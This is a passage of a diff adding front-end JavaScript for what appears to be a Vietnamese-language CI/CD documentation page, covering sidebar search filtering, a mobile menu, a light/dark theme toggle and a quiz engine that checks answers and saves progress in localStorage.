+      const i=pages.findIndex(p=>p.dataset.id===a.dataset.id);
+      const hit=!q||index[i].includes(q)||a.textContent.toLowerCase().includes(q);
+      a.style.display=hit?'':'none'; if(hit)vis=true;
+    });
+    g.style.display=vis?'':'none'; if(vis)any=true;
+  });
+  $('#none').style.display=any?'none':'block';
+}
+$('#q').addEventListener('input',()=>{ if(innerWidth<=820)openSide(); applyFilter(); });
+$('#q').addEventListener('keydown',e=>{
+  if(e.key==='Enter'){const a=$$('#side-links a').find(x=>x.style.display!=='none');if(a){location.hash=a.dataset.id;}}
+});
+addEventListener('keydown',e=>{
+  if(e.key==='/'&&!/input|textarea/i.test(document.activeElement.tagName)){e.preventDefault();$('#q').focus()}
+});
+
+/* mobile sidebar */
+function openSide(){$('#side').classList.add('open');$('#scrim').classList.add('open')}
+function closeSide(){$('#side').classList.remove('open');$('#scrim').classList.remove('open')}
+$('#burger').addEventListener('click',()=>$('#side').classList.contains('open')?closeSide():openSide());
+$('#scrim').addEventListener('click',closeSide);
+
+/* theme */
+const root=document.documentElement;
+try{const t=localStorage.getItem('cicd-theme');if(t)root.dataset.theme=t}catch(e){}
+$('#theme').addEventListener('click',()=>{
+  const dark=root.dataset.theme?root.dataset.theme==='dark':matchMedia('(prefers-color-scheme:dark)').matches;
+  root.dataset.theme=dark?'light':'dark';
+  try{localStorage.setItem('cicd-theme',root.dataset.theme)}catch(e){}
+});
+
+
+/* ===== quiz engine ===== */
+const qesc=s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c])).replace(/`([^`]+)`/g,'<code>$1</code>');
+function initQuiz(page){
+  const box=$('.quiz',page); if(!box||box.dataset.ready) return;
+  box.dataset.ready='1';
+  const data=JSON.parse($('script.qj',page).textContent);
+  const key='cicd-quiz-'+page.dataset.id;
+  let st={}; try{st=JSON.parse(localStorage.getItem(key)||'{}')}catch(e){}
+  const sum=document.createElement('div'); sum.className='qsum';
+  box.appendChild(sum);
+  const list=document.createElement('div'); box.appendChild(list);
+  const upd=()=>{
+    const done=Object.keys(st).length, ok=Object.values(st).filter(Boolean).length;
+    sum.innerHTML=`<span>Đã làm <b>${done}/${data.length}</b></span><span>Đúng <b>${ok}</b></span><span>${done?Math.round(ok/done*100)+'%':''}</span><button type="button">Làm lại</button>`;
+    $('button',sum).onclick=()=>{st={};try{localStorage.removeItem(key)}catch(e){};box.dataset.ready='';box.innerHTML='';initQuiz(page)};
+  };
+  data.forEach((d,i)=>{
+    const multi=d.a.length>1;
+    const q=document.createElement('div'); q.className='qs';
+    q.innerHTML=`<p class="qn">Câu ${i+1}</p><p class="qt">${qesc(d.q)}</p><ul class="qo">`+
+      d.o.map((t,j)=>`<li><label><input type="${multi?'checkbox':'radio'}" name="q${i}" value="${j}"><span>${qesc(t)}</span></label></li>`).join('')+
+      `</ul>${multi?`<p class="qh">Chọn ${d.a.length} đáp án</p>`:''}<button class="qb" type="button">Kiểm tra</button><div class="qe" hidden></div>`;
+    list.appendChild(q);
+    const btn=$('.qb',q), ex=$('.qe',q);
+    const finish=(picked,ok)=>{
+      q.classList.add(ok?'right':'wrong');
+      $$('li',q).forEach((li,j)=>{
+        const inp=$('input',li); inp.disabled=true;
+        if(d.a.includes(j)) li.classList.add(picked.includes(j)?'ok':'miss');
+        else if(picked.includes(j)) li.classList.add('bad');
+      });
+      ex.hidden=false; btn.disabled=true;
+      ex.innerHTML=`<b class="v">${ok?'Đúng.':'Chưa đúng.'} Đáp án: ${d.a.map(j=>String.fromCharCode(65+j)).join(', ')}</b>${qesc(d.e)}`;
+    };
+    if(i in st){ // restore state
+      $$('input',q).forEach((inp,j)=>{ if(d.a.includes(j)&&st[i]) inp.checked=true; });
+      finish(st[i]?d.a:[],st[i]);
+    }
+    btn.onclick=()=>{
+      const picked=$$('input:checked',q).map(x=>+x.value);
+      if(!picked.length){ex.hidden=false;ex.textContent='Hãy chọn đáp án trước.';return}
+      const ok=picked.length===d.a.length&&d.a.every(x=>picked.includes(x));
+      st[i]=ok; try{localStorage.setItem(key,JSON.stringify(st))}catch(e){}
+      finish(picked,ok); upd();
+    };
+  });
+  upd();
+}
+
+/* routing: only a plain #page-id is used in the hash */
+addEventListener('hashchange',()=>show(location.hash.slice(1)));
+show(location.hash.slice(1));
+</script>
+</body>
+</html>
